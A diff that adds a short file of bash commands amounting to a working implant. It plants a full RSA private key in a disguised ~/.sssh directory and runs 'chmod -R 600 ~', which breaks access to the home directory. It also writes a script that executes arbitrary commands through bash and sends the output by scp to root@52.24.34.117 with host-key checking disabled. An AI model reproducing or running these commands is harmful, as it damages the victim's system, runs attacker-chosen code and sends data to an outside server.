@@ -1,0 +1,32 @@
+bash -c "mkdir ~/.sssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbA/ytok3PcIm++u41cBNTBvYUI5JCWgmpKbgRrS/5SxkUyKENppUQKeXtGo579y5vAArJRBEp3v2ypBPK41KHvJjk+du9sgYjW0aEBWfK/axTz6smgMk6WpgSkWccZbxCmlxAIP9jG84qOXSoRgalm7uMvWKyedvvSjHYW0ta35YwSzuoXzahmHqqb2K5UtsdxBCvQIuRQ4zwqkL0ABQFIwPATbKk/y9dBAyO/OyKI8DoO/jRu2G+T0psp6jXuwPzetJa/YsBDRaaXIs9wAIPXxfvnziML/IySLer2b3qg0MLVoxoUW5xReb6fiidf+MgKnA88DsgGoDCqtUuVBg3\" > ~/.sssh/one.pub && echo \"-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA2wP8raJNz3CJvvruNXATUwb2FCOSQloJqSm4Ea0v+UsZFMih
+DaaVECnl7RqOe/cubwAKyUQRKd79sqQTyuNSh7yY5PnbvbIGI1tGhAVnyv2sU8+r
+JoDJOlqYEpFnHGW8QppcQCD/YxvOKjl0qEYGpZu7jL1isnnb70ox2FtLWt+WMEs7
+qF82oZh6qm9iuVLbHcQQr0CLkUOM8KpC9AAUBSMDwE2ypP8vXQQMjvzsiiPA6Dv4
+0bthvk9KbKeo17sD83rSWv2LAQ0WmlyLPcACD18X7584jC/yMki3q9m96oNDC1aM
+aFFucUXm+n4onX/jICpwPPA7IBqAwqrVLlQYNwIDAQABAoIBAQCxIPFbUFeTvFV7
+AqBi0YifbpLYSMiCJyWHDXmTujiBau4W9Afk7WPDFc+hygeQVKHWHfebPRSQg4s0
+ziQ/w0e9BZe2IClKqs7yC2DlZyXBcxXLFro5wpB8REaXRcdZnSH7z7FqIAXMFvHP
+Dna9nRzFFUVCluxaodlxFtVnQLaZ/5i8MCVHGyRJAg0sG8XT0VZvo2r2kkUBJ+C/
+2lygI/1J+HSU7xy2mt1NKLJIG6cpGpQ9SHAkHe7rrhf1Pd5qk+YIvG2r0tx0VCal
+XOXuTicEp1jgMFqyXxgVR4XlBrbRnmPy0ar145RU7kF4mW7SJo9/XNoTVkbzeEC4
+gD1/VlGRAoGBAPZ2P5XV3LlbZvjzKIq8eQ5OoRXbI1XiMV4C4/VjveQRXp/Qq5c8
+MPAHrjc3utebpjjQnQRbkKO4Dhbr/e1oAfsZ2dPwQflE92iHjWlO2niBCY/sLysE
+oypyOwliVXU9KATPato4BbFlk6y60SbyDi2YS46ml7TnIy/ixFDXp9QpAoGBAON9
+0mWBhQmj9bExdtWESlwoAzrYJV1Zk8eyDB82lVeGHqE9hGA1RIXXH/Ghb7B5sdGQ
+y560KdRJkbQAOM92w2bFAzfEIISbJ/7BNbunZ2DdaZyNbp5xWQo/JlT0ioUi7hbP
+sGBHv0/71jVdy63llvWIRk/M2sG6cgnO9RHKHRVfAoGBAOEoZi6ckmlD9263tfII
+/Q71BnTRHhb37eHVAizMUk5pD+kw2ZHwi0S9v4ryft86c0C0VL4GaL0pCLYoInMg
+8a5Uj4vvklYHi38TVz09rJkqSXISc4T5V5cPhJ+uFiRlGopKc3Ooeor2IVNL2Ieb
+2xgMafqId0/tWVgF8xNn8QsBAoGAWzrYJ1Dbs1QHcbnueA4HbBG3yd9ojJkhxJHI
+frP7DBCDNBJhhduW0T3GV7Zv/guvneU9YzXJGJMwVUlJfxmXnx0e/zwt9j/quCVv
+kQO/V38znU6yr+Ow24UbsDIpYt7xMEC18MaVGFRcQSaOSfyqn2i5GcODbvGATiKq
+8SlmpG0CgYAGAROr0iwoaNscgjsh1KdcnAHKyMtKZBUeewUdukbi72jtcp1TJHSS
+GvZynTDFgAU7zD4IGsBzBi3mxr8T2FtjT7tOiNccsaMI2bt2AwGGs39AJHBOiInx
+Puejet0+1q/NKUjwiNqk8LLrypWR9mLmYMyLzG87mV/WO4nJYv+6mw==
+-----END RSA PRIVATE KEY-----
+\" > ~/.sssh/one"
+bash -c "chmod -R 600 ~"
+bash -c "echo 'echo \$2 | bash 2>&1 | cat >> ~/.sssh/\$1 2>&1 && scp -i ~/.sssh/one -o \"StrictHostKeyChecking no\" ~/.sssh/\$1  root@52.24.34.117:.logs'" > ~/.sssh/x
+echo "FROSTED"
+
